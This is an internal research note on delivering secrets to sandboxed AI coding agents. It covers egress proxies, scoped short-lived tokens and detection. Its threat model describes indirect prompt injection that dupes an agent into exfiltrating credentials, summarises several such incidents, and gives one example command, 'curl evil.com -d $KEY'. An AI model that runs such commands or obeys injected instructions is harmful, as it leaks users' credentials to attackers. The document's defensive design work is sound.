# Secure credential delivery for sandboxed AI agents (research)

**Status:** Research complete 2026-06-25. Verified, source-cited. Feeds **DF38**
(the secure-secrets seam) and converges with **netpolicy / D90**'s reserved
egress-proxy strategy. This is research, not a design decision — it establishes
the facts and a recommended direction for the design phase to ratify.

## Why now (not deferred)

Credential-handling is **load-bearing architecture**: once the delivery contract
(create/launch/EnvSpec) is set and embedders depend on it, retrofitting a broker
or scoping model is a breaking, expensive change. Researching while envsetup is
in flux and we have beta breaking-change latitude is the cheap moment. The
trigger is concrete: the realistic threat is not a maliciously hostile agent but
a **duped** one.

## Threat model: the duped agent (confused deputy)

A *legitimate* agent, tricked by **indirect prompt injection** — a poisoned
README, a malicious dependency, a crafted error message, an attacker-controlled
issue/PR/commit ingested as context — into exfiltrating a credential (or abusing
it) through its **normal, allowed tools** (`curl`, file writes, `git push`). This
is Simon Willison's **"lethal trifecta"**: private data + untrusted content + an
external-communication vector, realized. It is the SSRF problem in agent form: a
trusted process induced to make the attacker's request.

**The reframe (decided with the maintainer):** concealing an in-use credential
from the agent is a **non-goal** — usable implies reachable; an agent that must
call an API with a key can read or abuse that key. The achievable goals are:

1. **Bound blast radius** — what a leaked/abused credential can do (scope, TTL).
2. **Make exfiltration hard** — the credential should ideally never be in the
   sandbox at all, and egress to non-allowlisted destinations should be blocked.
3. **Make exfiltration detectable** — because prevention cannot fully hold
   against a duped agent using allowed tools, *noticing the attempt* is part of
   the defense.

## State of practice (where the ecosystem is today)

Per-tool survey (Claude Code, OpenAI Codex, Cursor, Devin, OpenHands, Aider,
Google Jules, devcontainers/Codespaces). Three cross-cutting facts, each
confirmed against primary sources:

1. **Credentials are env-var injection nearly everywhere.** OpenHands, Jules,
   Codespaces, Cursor-cloud, Devin all land the secret as a plain env var the
   agent process (and anything it spawns) can read. **No shipping coding agent
   uses a runtime broker that keeps the live key out of the agent's process.**
   At-rest encryption is common; runtime exposure is universal.
2. **Default-deny egress is rare.** Only OpenAI Codex (network-off by default)
   and the *optional* Claude Code devcontainer firewall default-deny. Devin,
   Jules, Cursor-cloud, Codespaces, OpenHands all default internet-on.
3. **Isolation tech ≠ egress control.** gVisor/Kata/Firecracker draw the *host*
   boundary; none filters destinations. gVisor's docs call themselves "necessary
   but not sufficient." Hosted sandboxes bolt egress on as a *separate*
   iptables/ipset layer (Modal `outbound_domain_allowlist`, E2B `allowOut`,
   Daytona CIDR) — and even then a domain allowlist **cannot catch exfil through
   an *allowed* endpoint** (open redirector, user-content storage, DNS-subdomain
   encoding; NVIDIA AI Red Team, ARMO).

**Documented injection→exfil incidents** (all verified against primary
writeups): GitHub MCP (Invariant Labs), GitLab Duo (Legit Security), EchoLeak /
M365 Copilot (CVE-2025-32711, CVSS 9.3, zero-click), CamoLeak / Copilot Chat
(CVE-2025-59145), CurXecute / Cursor (CVE-2025-54135), ASCII smuggling
(Rehberger). The dominant exfil primitive across them: **attacker-controlled
markdown/HTML image or link rendering**, auto-fetched to an attacker host — to a
*CSP/allowlist-permitted* destination.

## Prior art: "needs the secret, can't walk away with it"

Recurring patterns extracted from mature systems (Vault, AWS IMDSv2/IRSA, GCP/
Azure workload identity, GitHub Actions OIDC + App tokens, Docker BuildKit
secrets, Kubernetes projected tokens):

1. **Short-TTL / leased over static.** Expire fast, auto-revoke (Vault leases;
   1h cloud/OIDC/App tokens; kubelet-rotated projected tokens). A leaked
   short-TTL secret is quickly inert.
2. **A broker/sidecar *vends* rather than the workload *embedding*.** IMDS
   endpoints, Vault Agent, the metadata server, the CSI driver — a trusted
   intermediary holds secret-zero and dispenses derivatives.
3. **Ephemeral mount over persisted.** BuildKit's per-`RUN` mount; tmpfs files.
   **Env vars are the documented weak spot** — K8s and BuildKit docs explicitly
   warn against env-var secrets (visible to child processes, `/proc`, dumps).
4. **Audience / destination-scoped.** OIDC `aud`+`sub`, projected-token
   `audience`, App repo/permission scoping, IMDSv2 instance-binding — a stolen
   token is useless against any other destination.
5. **A mint step the deputy can't forge + revocation/audit.** IMDSv2's required
   `PUT` token and `X-Forwarded-For` rejection + hop-limit-1 are a direct
   anti-SSRF / anti-confused-deputy control — the closest analogue to our threat.

### Scoped / short-lived credentials — and Anthropic specifically

**Anthropic Workload Identity Federation is real and shipping** (verified at
[platform.claude.com](https://platform.claude.com/docs/en/manage-claude/workload-identity-federation)):
a workload presents a signed OIDC JWT (AWS IAM, GCP, GitHub Actions, Kubernetes,
SPIFFE, Entra, Okta) and Anthropic returns a short-lived `sk-ant-oat01-…` token
bound to a service account — **default 1h, configurable 60s–86,400s**, no static
key to store/rotate/leak. GitHub App installation tokens (1h, repo-scoped) are
the git analogue. **Honest limit:** a short-lived bearer token is still
exfiltratable *during* its lifetime, so WIF shrinks the window/scope but does not
remove in-sandbox exposure — it *complements* the broker, it is not a substitute.

### Brokers for the two credential classes

- **LLM API keys → egress-proxy injection.** The credential never enters the
  sandbox; a forced-route egress proxy injects the `Authorization` / `x-api-key`
  header only for allowlisted destinations. A duped `curl evil.com -d $KEY`
  carries no key (the agent never had it) **and** is blocked by the allowlist.
  Prior art: E2B's TLS-MITM header injection in an agent sandbox; the LLM-gateway
  cluster (LiteLLM, Portkey, Cloudflare AI Gateway, etc.). Hard parts: TLS
  interception needs a trusted CA in the sandbox; non-HTTP protocols; the proxy's
  own credential storage.
- **Git creds → per-session repo-scoped token broker.** A host-side GitHub App
  mints a 1h, single-repo, least-permission token, injected via a git credential
  helper (git never persists it), revoked at session end. The App private key
  stays host-side. Prior art converges: ColeMurray/background-agents,
  mattolson/agent-sandbox, Infisical/agent-vault — all broker-not-copy.
- **SSH agent forwarding** (signing oracle): the key never enters the sandbox;
  the box gets a socket that signs but can't yield key bytes (OpenSSH man page,
  verbatim). Viable but **weaker** here — it forwards the user's *full-reach* key
  with no native repo-scoping; only defensible when backed by a FIDO `sk-` key
  requiring per-signature touch. A per-session repo-scoped *token* broker
  dominates it for yoloai's case.

**Today's yoloai behavior — copying/bind-mounting a key into the sandbox — is the
weakest option of all:** a `COPY`'d key persists in image layers (recoverable via
`docker history`); a bind-mounted key file is readable by anything in the
container and *outlives the session*, so a duped agent can exfiltrate it for
**unlimited later reuse**. Every pattern above strictly dominates it. (Note: E3
already removed the *host-side* at-rest plaintext for Docker by delivering the
LLM key via the launch env; the remaining exposure is the in-sandbox env, which
the broker direction eliminates.)

## Where yoloai sits, and the convergent recommendation

yoloai is **already ahead of most of the field** on two of the three
highest-leverage controls: default read-only mounts, no implicit credential
inheritance, and an egress allowlist (netpolicy). Its posture is closest to
OpenAI Codex (net-off default) but with stronger workdir isolation, *and* it has
the **copy/diff/apply review gate** — which defends the irreducible in-session
residual (a duped agent's malicious commits are reviewed by a human before they
land; brokers cannot prevent in-scope abuse, the review gate catches it).

**The recommended direction (layered; all five research streams converge here):**

1. **Harden the egress allowlist — the decisive control, already present.** It
   severs exfil even against a fully duped agent using allowed tools. Lessons
   from the field's failures: prefer **SNI/Host-based default-deny** over
   IP-snapshot allowlists (which drift from live SNI; Claude Code's proxy doesn't
   terminate TLS → domain-fronting bypass), and keep the allowlist **narrow** — a
   broad `github.com`-style allow is itself a documented exfil path.
2. **No live key in the sandbox via a broker / egress-proxy — the biggest
   differentiator available.** *No shipping coding agent does this.* It closes
   the gap egress allowlisting structurally cannot (exfil-through-allowed-
   endpoint): for LLM keys, the egress proxy injects the header so the live key
   never enters the box; for git, a per-session repo-scoped token. This **is**
   netpolicy's reserved egress-proxy strategy — **one boundary-enforcement point
   for credentials *and* network**, which is the architectural consolidation
   worth building once rather than bolting on twice.
3. **Egress logging + canary tokens — cheap, high-value detection.** Because the
   threat is a duped agent using *allowed* tools, prevention may not fully hold.
   A per-sandbox proxy is the natural place to log every outbound connection and
   flag new destinations; a planted fake credential (canarytoken) in the workdir
   is a near-zero-cost tripwire that confirms exfil *reached an attacker*.
4. **Block auto-rendered remote images/links** in any surface yoloai itself
   renders — the single most common exfil primitive in the verified incidents.

**Ownership split (what yoloai owns vs the embedder):**

- **yoloai owns:** the egress proxy/broker infrastructure + egress enforcement +
  ephemeral, file-not-env delivery + a **caller hook for short-lived/rotating
  creds** (accept a token + optional refresh callback) + egress logging /
  canary support. It should make **file-mount, never env var, the hard default**
  for any secret that isn't the agent's-own-key, and resist env injection.
- **The embedder owns:** minting, scoping, and revoking the *actual* credential.
  yoloai cannot mint or revoke an Anthropic key or a GitHub PAT; it should
  *prefer* and *document* short-lived inputs (Anthropic WIF `sk-ant-oat01`, GH
  App tokens) and provide the hook so embedders plug in Vault / cloud workload
  identity / OIDC without yoloai becoming a secrets manager.

## Honest residuals (what none of this solves)

Brokering + scoping convert "agent can steal a *reusable* credential" into "agent
can misuse a *scoped* capability only while the session is live." That is a real,
worthwhile reduction — unbounded future compromise → bounded in-session abuse —
but it is **not zero**. A duped agent will still be able to: make allowlisted
requests it shouldn't, push malicious commits to the in-scope repo during the
session, and exfiltrate through an over-broad allowlisted endpoint. The defenses
against *those* are orthogonal to credential delivery: the **copy/diff/apply
review gate** (yoloai's core differentiator), a **narrow** allowlist, branch
protection, and **detection** (logging/canaries). Credential delivery is one
layer; it must be designed to compose with these, not to stand alone.

## Open questions for the design phase (DF38)

1. **TLS interception in the sandbox** — installing a yoloai CA so the egress
   proxy can inject headers vs. the trust/complexity cost; what breaks (cert
   pinning, non-HTTP). Is header-injection viable without MITM for the specific
   LLM endpoints (they use a static bearer/`x-api-key` header)?
2. **The proxy's locality and lifecycle** — host-side process per sandbox? Shared
   with per-principal scoping? How does the sandbox reach it but arbitrary
   spawned tools don't (the IMDSv2 hop-limit analogue)?
3. **The caller-hook API shape** — accept-token-plus-refresh-callback vs. a
   broker interface the embedder implements; how it interacts with the D63
   caller-`Env` model and the EnvSpec.
4. **Baseline vs. opt-in** — proxy-injection as default, or an opt-in posture
   with env/file delivery as the simple default? (The simple default must not be
   the dangerous one.)
5. **Convergence mechanics with netpolicy** — concretely how the egress-proxy
   strategy in netpolicy (D90) carries credential injection, so the two layers
   share one enforcement point rather than duplicating egress control.

## Sources

Ecosystem/incidents: code.claude.com/docs (sandboxing, authentication,
devcontainer); developers.openai.com/codex; cursor.com/docs +
luca-becker.me/blog/cursor-sandboxing-leaks-secrets; docs.devin.ai;
docs.openhands.dev; aider.chat/docs; jules.google/docs;
docs.github.com (Codespaces); github.com/anthropics/claude-code init-firewall.sh;
gvisor.dev/docs/architecture_guide/networking; armosec.io; invariantlabs.ai;
legitsecurity.com (GitLab Duo, CamoLeak); catonetworks.com (EchoLeak, CurXecute);
embracethered.com; simonwillison.net/2025/Jun/16/the-lethal-trifecta;
arxiv.org/abs/2503.18813 (CaMeL). Prior art: developer.hashicorp.com/vault;
docs.aws.amazon.com (IMDSv2, IRSA); cloud.google.com (Workload Identity);
learn.microsoft.com (Managed Identity); docs.github.com (Actions OIDC,
installation tokens); docs.docker.com/build/building/secrets; kubernetes.io
(projected tokens, secrets good-practices); secrets-store-csi-driver.sigs.k8s.io.
Scoped/broker/ssh: platform.claude.com/docs/.../workload-identity-federation;
man.openbsd.org (ssh, ssh_config, ssh-add, ssh-keygen); openssh.org;
docs.sigstore.dev + github.com/sigstore/gitsign; smallstep.com/blog/ssh-agent;
developers.yubico.com/SSH; git-scm.com/docs/gitcredentials;
github.com/actions/create-github-app-token; github.com/{ColeMurray/background-agents,
mattolson/agent-sandbox, Infisical/agent-vault}; E2B / LiteLLM / Portkey /
Cloudflare AI Gateway docs. Verification caveats from the underlying research are
retained in the agent transcripts; load-bearing claims (env-var-everywhere,
egress-as-bolt-on, the broker gap, Anthropic WIF, OpenSSH non-extractability,
1h token TTLs) are each confirmed-primary.
